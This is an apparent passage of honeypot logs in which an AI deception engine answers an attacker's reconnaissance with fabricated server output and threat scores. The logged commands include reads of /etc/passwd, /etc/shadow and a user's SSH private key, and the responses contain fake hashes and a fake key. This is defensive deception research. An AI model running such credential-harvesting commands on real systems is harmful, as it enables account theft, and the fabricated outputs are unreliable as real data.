    "response": "[2023-12-01 14:30:00] AUDIT LOG: Command executed by root: dmesg | tail\n\n[2023-12-01 14:30:00] AUDIT LOG: Command output:\n\n[    0.000000] Linux version 5.15.0-91-generic (buildd@lcy02-amd64-043)\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.0-91-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro\n[    0.051234] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'\n[    1.431205] EXT4-fs (dm-0): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.\n[    2.980120] systemd[1]: Inserted module 'autofs4'\n[    5.120482] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 75,
        "risk_level": "CRITICAL",
        "final_score": 75,
        "threat_level": "CRITICAL",
        "base_score": 75,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 40,
            "unique_commands": 37,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 487,
            "commands_executed": 40,
            "successful_commands": 39,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 1,
            "engagement_score": 73,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 75,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,127 - {"session_id": "71dd20b2", "command": "dmesg | tail", "attack_type": "Unknown", "risk_score": 75, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,127 - {
    "session_id": "71dd20b2",
    "command": "dmesg | tail",
    "ai_decision": "[2023-12-01 14:30:00] AUDIT LOG: Command executed by root: dmesg | tail\n\n[2023-12-01 14:30:00] AUDIT LOG: Command output:\n\n[    0.000000] Linux version 5.15.0-91-generic (buildd@lcy02-amd64-043)\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.0-91-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro\n[    0.051234] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'\n[    1.431205] EXT4-fs (dm-0): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.\n[    2.980120] systemd[1]: Inserted module 'autofs4'\n[    5.120482] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 40
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 75,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,127 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: dmesg | tail",
    "ai_decision": "[2023-12-01 14:30:00] AUDIT LOG: Command executed by root: dmesg | tail\n\n[2023-12-01 14:30:00] AUDIT LOG: Command output:\n\n[    0.000000] Linux version 5.15.0-91-generic (buildd@lcy02-amd64-043)\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.0-91-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro\n[    0.051234] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'\n[    1.431205] EXT4-fs (dm-0): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.\n[    2.980120] systemd[1]: Inserted module 'autofs4'\n[    5.120482] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,213 - {
    "session_id": "71dd20b2",
    "query": "cat /etc/passwd",
    "response": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 80,
        "risk_level": "CRITICAL",
        "final_score": 80,
        "threat_level": "CRITICAL",
        "base_score": 80,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 41,
            "unique_commands": 38,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 41,
            "successful_commands": 40,
            "failed_commands": 1,
            "files_accessed": 1,
            "services_accessed": 1,
            "engagement_score": 75,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 80,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,214 - {"session_id": "71dd20b2", "command": "cat /etc/passwd", "attack_type": "Privilege Enumeration", "risk_score": 80, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,214 - {
    "session_id": "71dd20b2",
    "command": "cat /etc/passwd",
    "ai_decision": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 41
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 80,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,214 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /etc/passwd",
    "ai_decision": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,288 - {
    "session_id": "71dd20b2",
    "query": "cat /etc/shadow",
    "response": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 85,
        "risk_level": "CRITICAL",
        "final_score": 85,
        "threat_level": "CRITICAL",
        "base_score": 85,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 42,
            "unique_commands": 39,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 42,
            "successful_commands": 41,
            "failed_commands": 1,
            "files_accessed": 2,
            "services_accessed": 1,
            "engagement_score": 77,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 85,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,288 - {"session_id": "71dd20b2", "command": "cat /etc/shadow", "attack_type": "Privilege Enumeration", "risk_score": 85, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,288 - {
    "session_id": "71dd20b2",
    "command": "cat /etc/shadow",
    "ai_decision": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 42
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 85,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,288 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /etc/shadow",
    "ai_decision": "root:$6$rounds=40000$saltsaltsalt$M1U5B2r7s7d1i9s1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2:19000:0:99999:7:::\nubuntu:$6$rounds=40000$anothersalt$v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8:19000:0:99999:7:::\ndev:$6$rounds=40000$yetanothersalt$f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7:19000:0:99999:7:::\nadmin:$6$rounds=40000$adminsalt$M6t8Y9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8:19000:0:99999:7:::\nsupport:$6$rounds=40000$supportsalt$p8q9r0s1t2u3v4w5x6y7z8a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9:19000:0:99999:7:::\nbackupuser:$6$rounds=40000$backupsalt$y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1:19000:0:99999:7:::",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,382 - {
    "session_id": "71dd20b2",
    "query": "cat /home/ubuntu/.ssh/id_rsa",
    "response": "-----BEGIN OPENSSH PRIVATE KEY-----\n3BgAGXDzReFxAQiQlbPSSv3yH48kufBQP8RYx1fA/nMmBIHE8aEknpVwgcFR4wHJLsZFHu\n4bmKOPJyhox3tc+tDz57wVZJesbXjQxWIZXivHG+Y/GOdXFF0DLPC+wTnzVJ3BQC8rxfRR\nQF3we0ULoPhcY8VYxg29iGmJg7FxD3bWFhMLwZfksCc/k+qsUHN5pDKOk6V/wh1SOUXr9Y\nwdSWJxJSrR3rfoT2VA3l0Z2T5kCRZJq4Fed6VY0ZQvYnlufaQkMDq2k9WmFsKWGgiE+rLA\nWHiEZlcJoARJv9UgLqmTgvFKp22kRyrdWmTUHX1R/DeeYNOgM7RiK8jmnQx0/g==\n-----END OPENSSH PRIVATE KEY-----",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 86,
        "risk_level": "CRITICAL",
        "final_score": 86,
        "threat_level": "CRITICAL",
        "base_score": 86,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 43,
            "unique_commands": 40,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 43,
            "successful_commands": 42,
            "failed_commands": 1,
            "files_accessed": 3,
            "services_accessed": 1,
            "engagement_score": 79,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 86,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,382 - {"session_id": "71dd20b2", "command": "cat /home/ubuntu/.ssh/id_rsa", "attack_type": "Unknown", "risk_score": 86, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,383 - {
    "session_id": "71dd20b2",
    "command": "cat /home/ubuntu/.ssh/id_rsa",
    "ai_decision": "-----BEGIN OPENSSH PRIVATE KEY-----\n3BgAGXDzReFxAQiQlbPSSv3yH48kufBQP8RYx1fA/nMmBIHE8aEknpVwgcFR4wHJLsZFHu\n4bmKOPJyhox3tc+tDz57wVZJesbXjQxWIZXivHG+Y/GOdXFF0DLPC+wTnzVJ3BQC8rxfRR\nQF3we0ULoPhcY8VYxg29iGmJg7FxD3bWFhMLwZfksCc/k+qsUHN5pDKOk6V/wh1SOUXr9Y\nwdSWJxJSrR3rfoT2VA3l0Z2T5kCRZJq4Fed6VY0ZQvYnlufaQkMDq2k9WmFsKWGgiE+rLA\nWHiEZlcJoARJv9UgLqmTgvFKp22kRyrdWmTUHX1R/DeeYNOgM7RiK8jmnQx0/g==\n-----END OPENSSH PRIVATE KEY-----",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 43
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 86,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,383 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /home/ubuntu/.ssh/id_rsa",
